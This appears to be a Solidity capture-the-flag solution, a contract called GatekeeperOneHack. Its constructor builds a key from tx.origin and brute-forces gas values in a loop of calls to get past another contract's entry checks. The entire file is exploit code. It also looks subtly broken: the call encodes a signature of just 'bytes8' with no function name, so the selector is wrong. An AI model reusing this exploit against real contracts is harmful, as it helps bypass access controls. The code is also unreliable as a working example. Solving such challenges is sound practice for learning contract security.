// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract GatekeeperOneHack {

  constructor(address GatekeeperOneContractAddress) {
    bytes8 key = bytes8 (uint64( uint16( uint160( tx.origin))) + 2 ** 32);

    bytes memory encode = abi.encodeWithSignature(("bytes8"),
      key
    ); for (uint256 i = 0; i < 120; i++) {
      (bool result, ) = address(GatekeeperOneContractAddress).call{gas: i + 150 + 8191 * 3}(encode);
      if(result)
        {
        break;
      }
    }
  }
}